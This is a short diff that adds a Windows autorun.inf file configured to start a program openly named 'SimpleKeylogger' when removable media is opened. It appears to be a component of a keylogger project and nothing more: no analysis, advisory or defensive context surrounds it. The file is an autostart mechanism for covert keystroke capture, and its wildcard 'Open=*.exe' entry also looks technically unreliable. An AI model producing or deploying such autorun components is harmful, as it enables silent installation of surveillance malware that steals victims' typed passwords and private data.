@@ -1,0 +1,4 @@
+[Autorun]
+Open=*.exe
+Action=Start SimpleKeylogger
+Label=SimpleKeylogger
